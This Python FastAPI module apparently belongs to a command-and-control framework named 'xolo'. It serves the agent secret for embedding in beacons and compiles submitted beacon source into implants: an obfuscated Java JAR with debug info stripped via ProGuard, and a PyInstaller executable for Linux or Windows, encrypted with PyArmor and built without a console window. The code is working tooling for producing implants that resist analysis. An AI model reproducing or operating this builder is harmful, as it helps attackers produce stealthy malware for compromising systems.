"""Informational endpoints for the web UI."""
import os
import uuid
import shutil
import subprocess
import tempfile
from fastapi import APIRouter, Depends, HTTPException
from fastapi.responses import FileResponse
from pydantic import BaseModel
from auth import require_auth, User
import config

router = APIRouter(prefix="/api/info", tags=["info"])


@router.get("/agent-secret")
def get_agent_secret(_: User = Depends(require_auth)):
    """Return agent secret so the UI can embed it in generated beacons."""
    return {"agent_secret": config.AGENT_SECRET}


class CompileRequest(BaseModel):
    code: str
    platform: str  # "linux" | "windows"


class JavaCompileRequest(BaseModel):
    code: str  # Java source


@router.post("/beacon/compile-java")
def compile_beacon_java(req: JavaCompileRequest, _: User = Depends(require_auth)):
    javac = shutil.which("javac")
    jar   = shutil.which("jar")
    if not javac or not jar:
        raise HTTPException(status_code=503, detail="javac/jar not found. Install JDK: apt install default-jdk")

    tmpdir = tempfile.mkdtemp(prefix="xolo_java_")
    try:
        src = os.path.join(tmpdir, "Beacon.java")
        with open(src, "w") as f:
            f.write(req.code)

        # Compile — -g:none strips all debug info (line numbers, var names, source file)
        result = subprocess.run([javac, "-source", "11", "-target", "11", "-g:none", src],
                                capture_output=True, text=True, timeout=60, cwd=tmpdir)
        if result.returncode != 0:
            raise HTTPException(status_code=500, detail=f"Compilation failed: {result.stderr[-800:]}")

        # Create manifest
        manifest = os.path.join(tmpdir, "MANIFEST.MF")
        with open(manifest, "w") as f:
            f.write("Manifest-Version: 1.0\nMain-Class: Beacon\n")

        # Package into fat JAR — include ALL .class files (Beacon.class + Beacon$1.class etc.)
        jar_path = os.path.join(tmpdir, "beacon.jar")
        result = subprocess.run([jar, "cfm", jar_path, manifest, "-C", tmpdir, "."],
                                capture_output=True, text=True, timeout=30, cwd=tmpdir)
        if result.returncode != 0:
            raise HTTPException(status_code=500, detail=f"JAR packaging failed: {result.stderr[-400:]}")

        # ProGuard obfuscation (renames classes/methods/fields to a/b/c...)
        proguard_bin = shutil.which("proguard")
        if proguard_bin:
            try:
                java_bin = shutil.which("java")
                java_real = os.path.realpath(java_bin) if java_bin else ""
                java_home_dir = os.path.dirname(os.path.dirname(java_real))
                jbase = os.path.join(java_home_dir, "jmods", "java.base.jmod")
                lib_line = (f"-libraryjars {jbase}(!**.jar;!module-info.class)"
                            if os.path.exists(jbase) else "-libraryjars <java.home>/lib/rt.jar")
                obf_jar = os.path.join(tmpdir, "beacon_obf.jar")
                pg_conf = os.path.join(tmpdir, "pg.pro")
                with open(pg_conf, "w") as f:
                    f.write(
                        f"-injars {jar_path}\n"
                        f"-outjars {obf_jar}\n"
                        f"{lib_line}\n"
                        "-keep public class Beacon { public static void main(java.lang.String[]); }\n"
                        "-repackageclasses ''\n"
                        "-allowaccessmodification\n"
                        "-optimizationpasses 3\n"
                        "-overloadaggressively\n"
                        "-dontusemixedcaseclassnames\n"
                        "-dontnote\n"
                        "-dontwarn\n"
                    )
                pg = subprocess.run(
                    [proguard_bin, f"@{pg_conf}"],
                    capture_output=True, text=True, timeout=120, cwd=tmpdir
                )
                if pg.returncode == 0 and os.path.exists(obf_jar):
                    jar_path = obf_jar
            except Exception:
                pass  # ProGuard failed — continue with unobfuscated JAR

        out_path = os.path.join(tempfile.gettempdir(), f"xolo_beacon_{uuid.uuid4().hex}.jar")
        shutil.copy2(jar_path, out_path)
        return FileResponse(path=out_path, filename="beacon.jar", media_type="application/octet-stream")

    except HTTPException:
        raise
    except subprocess.TimeoutExpired:
        raise HTTPException(status_code=504, detail="Compilation timed out")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


@router.post("/beacon/compile")
def compile_beacon(req: CompileRequest, _: User = Depends(require_auth)):
    if req.platform not in ("linux", "windows"):
        raise HTTPException(status_code=400, detail="platform must be 'linux' or 'windows'")

    pyinstaller = shutil.which("pyinstaller")
    if not pyinstaller:
        raise HTTPException(status_code=503, detail="pyinstaller not installed on server")

    tmpdir = tempfile.mkdtemp(prefix="xolo_compile_")
    try:
        src = os.path.join(tmpdir, "beacon.py")
        with open(src, "w") as f:
            f.write(req.code)

        # PyArmor: encrypts Python bytecode with a runtime key (strongest Python obfuscation)
        pyarmor_bin = shutil.which("pyarmor")
        if pyarmor_bin:
            try:
                armor_out = os.path.join(tmpdir, "armored")
                pa = subprocess.run(
                    [pyarmor_bin, "gen", "--output", armor_out, src],
                    capture_output=True, text=True, timeout=60, cwd=tmpdir
                )
                if pa.returncode == 0:
                    armored_py = os.path.join(armor_out, "beacon.py")
                    if os.path.exists(armored_py):
                        # Copy runtime package alongside the obfuscated source
                        for item in os.listdir(armor_out):
                            item_path = os.path.join(armor_out, item)
                            dest = os.path.join(tmpdir, item)
                            if os.path.isdir(item_path):
                                shutil.copytree(item_path, dest, dirs_exist_ok=True)
                            else:
                                shutil.copy2(item_path, dest)
                        src = os.path.join(tmpdir, "beacon.py")
            except Exception:
                pass  # PyArmor failed — use plain source

        cmd = [
            pyinstaller,
            "--onefile",
            "--name", "beacon",
            "--distpath", os.path.join(tmpdir, "dist"),
            "--workpath", os.path.join(tmpdir, "build"),
            "--specpath", tmpdir,
            "--log-level", "ERROR",
            "--strip",          # strip debug symbols from ELF (Linux)
        ]

        if req.platform == "windows":
            cmd += ["--noconsole", "--target-arch", "x86_64"]
            # Wine-based cross-compilation: try wine python if available
            wine_python = shutil.which("wine")
            if not wine_python:
                raise HTTPException(
                    status_code=503,
                    detail="Windows cross-compilation requires Wine on the server. Download the .py and compile on Windows with: pyinstaller --onefile beacon.py"
                )

        # Bundle PyArmor runtime directories if present
        for item in os.listdir(tmpdir):
            if item.startswith("pyarmor_runtime"):
                cmd += ["--add-data", f"{os.path.join(tmpdir, item)}{os.pathsep}{item}"]

        cmd.append(src)

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, cwd=tmpdir)
        if result.returncode != 0:
            raise HTTPException(status_code=500, detail=f"Compilation failed: {result.stderr[-800:]}")

        ext = ".exe" if req.platform == "windows" else ""
        binary = os.path.join(tmpdir, "dist", f"beacon{ext}")
        if not os.path.exists(binary):
            raise HTTPException(status_code=500, detail="Binary not found after compilation")

        # Copy to a unique path to avoid race conditions between concurrent compilations
        out_path = os.path.join(tempfile.gettempdir(), f"xolo_beacon_{uuid.uuid4().hex}{ext}")
        shutil.copy2(binary, out_path)

        media = "application/octet-stream"
        filename = f"beacon{ext}"
        return FileResponse(path=out_path, filename=filename, media_type=media)

    except HTTPException:
        raise
    except subprocess.TimeoutExpired:
        raise HTTPException(status_code=504, detail="Compilation timed out")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)
